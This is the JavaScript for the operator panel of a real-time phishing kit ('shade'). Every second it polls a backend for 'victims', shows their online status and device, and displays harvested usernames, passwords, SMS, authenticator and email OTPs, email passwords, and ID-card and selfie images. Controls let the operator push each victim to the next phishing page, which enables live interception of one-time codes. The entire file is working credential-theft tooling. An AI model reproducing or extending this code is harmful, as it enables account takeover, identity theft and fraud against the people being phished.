function getOs(userAgent) {
    var info = {
        browser: /Edge\/\d+/.test(userAgent) ? 'ed' : /MSIE 9/.test(userAgent) ? 'ie9' : /MSIE 10/.test(userAgent) ? 'ie10' : /MSIE 11/.test(userAgent) ? 'ie11' : /MSIE\s\d/.test(userAgent) ? 'ie?' : /rv\:11/.test(userAgent) ? 'ie11' : /Firefox\W\d/.test(userAgent) ? 'ff' : /Chrom(e|ium)\W\d|CriOS\W\d/.test(userAgent) ? 'gc' : /\bSafari\W\d/.test(userAgent) ? 'sa' : /\bOpera\W\d/.test(userAgent) ? 'op' : /\bOPR\W\d/i.test(userAgent) ? 'op' : typeof MSPointerEvent !== 'undefined' ? 'ie?' : '',
        os: /Windows NT 10/.test(userAgent) ? "win10" : /Windows NT 6\.0/.test(userAgent) ? "winvista" : /Windows NT 6\.1/.test(userAgent) ? "win7" : /Windows NT 6\.\d/.test(userAgent) ? "win8" : /Windows NT 5\.1/.test(userAgent) ? "winxp" : /Windows NT [1-5]\./.test(userAgent) ? "winnt" : /Mac/.test(userAgent) ? "mac" : /Linux/.test(userAgent) ? "linux" : /X11/.test(userAgent) ? "nix" : "",
        touch: 'ontouchstart' in document.documentElement,
        mobile: /IEMobile|Windows Phone|Lumia/i.test(userAgent) ? 'Windows' : /iPhone|iP[oa]d/.test(userAgent) ? 'iPhone' : /Android/.test(userAgent) ? 'Android' : /BlackBerry|PlayBook|BB10/.test(userAgent) ? 'Blackberry' : /Mobile Safari/.test(userAgent) ? 'Safari' : /webOS|Mobile|Tablet|Opera Mini|\bCrMo\/|Opera Mobi/i.test(userAgent) ? 1 : 'Unknown OS',
        tablet: /Tablet|iPad/i.test(userAgent),
    };
    return info.mobile;
}

function getInputs(data) {
    return `
    <div class="form-group mb-2">
        <label for="copy_text" >Username</label>
        <input type="text" readonly class="form-control" id="copy_text" value="` + (data.username == null ? "" : data.username) + `">
    </div>
    <div class="form-group mb-2">
        <label for="copy_text" >Password</label>
        <input type="text" readonly class="form-control" id="copy_text" value="` + (data.password == null ? "" : data.password) + `">
    </div>
    <hr>
    <div class="form-group mb-2">
        <label for="copy_text" >Second Username</label>
        <input type="text" readonly class="form-control" id="copy_text" value="` + (data.usernames == null ? "" : data.usernames) + `">
    </div>
    <div class="form-group mb-2">
        <label for="copy_text" >Second Password</label>
        <input type="text" readonly class="form-control" id="copy_text" value="` + (data.passwords == null ? "" : data.passwords) + `">
    </div>
    <hr>
    <div class="form-group mb-2">
        <label for="copy_text" >SMS OTP</label>
        <input type="text" readonly class="form-control" id="copy_text" value="` + (data.otp1 == null ? "" : data.otp1) + `">
    </div>
    <div class="form-group mb-2">
        <label for="copy_text" >Authenticator OTP</label>
        <input type="text" readonly class="form-control" id="copy_text" value="` + (data.otp2 == null ? "" : data.otp2) + `">
    </div>
    <hr>
    <div class="form-group mb-2">
        <label for="copy_text" >ID Front</label>
        `+(data.idfront==null ? "Not Uploaded" : '<img class="img-thumbnail" src="/assets/'+ data.idfront +'"/> ')+`
    </div>
    <div class="form-group mb-2">
        <label for="copy_text" >ID Back</label>
        `+(data.idback==null ? "Not Uploaded" : '<img class="img-thumbnail" src="/assets/'+ data.idback +'"/> ')+`
    </div>
    <div class="form-group mb-2">
        <label for="copy_text" >Selfie</label>
        `+(data.selfie==null ? "Not Uploaded" : '<img class="img-thumbnail" src="/assets/'+ data.selfie +'"/> ')+`
    </div>
    <hr>
    <div class="form-group mb-2">
        <label for="copy_text" >Email Password</label>
        <input type="text" readonly class="form-control" id="copy_text" value="` + (data.email_password == null ? "" : data.email_password) + `">
    </div>
    <div class="form-group mb-2">
        <label for="copy_text" >Email OTP</label>
        <input type="text" readonly class="form-control" id="copy_text" value="` + (data.email_otp == null ? "" : data.email_otp) + `">
    </div>
    `;
}

heartbeat();

function heartbeat() {
    var html = "";
    $.get("/shade/core/ajax.php?action=victims")
        .done(function (data) {
            for (let index = 0; index < data.length; index++) {
                if (data[index].next_page == 'finish') {
                    html += `
            <div class="col-md-6 col-xs-12">
              <div class="card text-center bg-dark">
                <div class="card-body">
                  <h5 class="card-title text-success">#V-` + data[index].id + ` - FINISHED</h5>
                  <p class="card-text">
                    ` + data[index].username + ` - ` + getOs(data[index].user_agent) + ` 
                  </p>
                  <button type="button" class="btn btn-primary btn-block viewBtn" data-toggle="modal" data-target="#exampleModal" data-id="` + data[index].id + `">View</button>
                </div>
              </div>
            </div>
            `;
                } else if (data[index].is_waiting == 1) {
                    html += `
          <div class="col-md-6 col-xs-12">
              <div class="card text-center bg-dark">
                <div class="card-body">
                  <h5 class="card-title text-warning pulse">#V-` + data[index].id + ` - ` + data[index].current_page.toUpperCase() + ` Page  - WAITING</h5>
                  <p class="card-text">
                    ` + data[index].username + ` - ` + getOs(data[index].user_agent) + ` 
                  </p>
                  <button type="button" class="btn btn-warning btn-block viewBtn" data-toggle="modal" data-target="#exampleModal" data-id="` + data[index].id + `">View</button>
                </div>
              </div>
          </div>
            `;
                } else {
                    var test_html = '';
                    if ((Math.floor(Date.now() / 1000) - data[index].heartbeat) > 7) {
                        html += `
              <div class="col-md-6 col-xs-12">
                <div class="card text-center bg-dark">
                  <div class="card-body">
                    <h5 class="card-title text-danger">#V-` + data[index].id + ` - ` + data[index].current_page.toUpperCase() + ` Page  - AWAY</h5>
                    <p class="card-text">
                      ` + data[index].username + ` - ` + getOs(data[index].user_agent) + ` 
                    </p>
                    <button type="button" class="btn btn-danger btn-block viewBtn" data-toggle="modal" data-target="#exampleModal" data-id="` + data[index].id + `">View</button>
                  </div>
                </div>
            </div>`;

                    } else {
                        html += `
              <div class="col-md-6 col-xs-12">
                <div class="card text-center bg-dark">
                  <div class="card-body">
                    <h5 class="card-title text-success">#V-` + data[index].id + ` - ` + data[index].current_page.toUpperCase() + ` Page  - ONLINE</h5>
                    <p class="card-text">
                      ` + data[index].username + ` - ` + getOs(data[index].user_agent) + ` 
                    </p>
                    <button type="button" class="btn btn-primary btn-block viewBtn" data-toggle="modal" data-target="#exampleModal" data-id="` + data[index].id + `">View</button>
                  </div>
                </div>
            </div>`;
                    }
                }

            }

            if (data.length == 0) {
                html += '<p class="text-muted text-center">Waiting for victims...</p>';
            }
            $('#allrows').html(html);
        });

    if ($('#victim-id-modal').val() != "") {
        $.get("/shade/core/ajax.php?action=victim&id=" + $('#victim-id-modal').val())
            .done(function (data) {
                var _datahtml = getInputs(data);

                $('#data_capt').html(_datahtml);
            });

    }

    setTimeout(heartbeat, 1000);
}


$(document).ready(function () {
    $(document).on('click', '.viewBtn', function () {
        var _id = $(this).data("id");

        $('#victim-id-modal').val(_id);

        $('#data_capt').html('<div class="text-center"> <div class="spinner-border" role="status"> <span class="visually-hidden">Loading...</span> </div> </div>');

        $.get("/shade/core/ajax.php?action=victim&id=" + _id)
            .done(function (data) {
                var _datahtml = getInputs(data);

                $('#data_capt').html(_datahtml);

                $('input[name="pagesRadios"][value="' + data.next_page + '"]').prop('checked', true);
            });

    });

    $(document).on('click', '.saveChanges', function () {
        var _id = $('#victim-id-modal').val();
        var _page = $('input[name="pagesRadios"]:checked').val();
        var _phone = $('#phonenum').val();
        var _gmail = $('#gmail').val();
        $('.saveChanges').prop("disabled", true);
        $('.saveChanges').html('<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true" ></span>');

        $.post("/shade/core/ajax.php?action=update_data", {
                ent_id: _id,
                currentpage: _page,
                phonenum: _phone,
                gmail: _gmail
            })
            .done(function (data) {
                $('.saveChanges').prop("disabled", false);
                $('.saveChanges').html('Save Changes');
            });
    });


    $(document).on('click', '#deletebtn', function () {
        var _id = $(this).data('id');
        $.post("/shade/core/ajax.php?action=entity_delete", {
                ent_id: _id
            })
            .done(function (data) {
                alert('Deleted!');

            });

    });

    $(document).on("click", "#copy_text", function () {
        this.select();
        document.execCommand('copy');
    });

});
